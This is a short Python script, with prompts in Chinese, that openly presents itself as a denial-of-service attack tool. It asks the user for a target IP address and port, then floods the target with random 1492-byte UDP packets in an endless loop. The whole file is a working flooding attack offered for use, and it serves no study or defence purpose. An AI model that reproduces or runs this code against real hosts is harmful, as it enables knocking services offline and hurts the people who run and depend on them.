import socket
import random
import time


def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1492)

    ip = input("請輸入欲攻擊IP: ")
    port = int(input("請輸入欲攻擊Port Number: "))
#    delay = int(input('輸入間隔 1~1000'))
    input('案任意鍵開始對%s:%s做DOS攻擊'% (ip,port)) 
    
    sock.sendto(bytes, (ip,port))
    print ("已傳送封包到 %s:%d" % (ip,port))
#    sent = 0
    while True:
        sock.sendto(bytes, (ip,port))
#        sent = sent + 1
#        print ("已傳送封包到 %s:%d" % (ip,port))
        #time.sleep((1000-delay)/2000)
if __name__ == "__main__":
    main()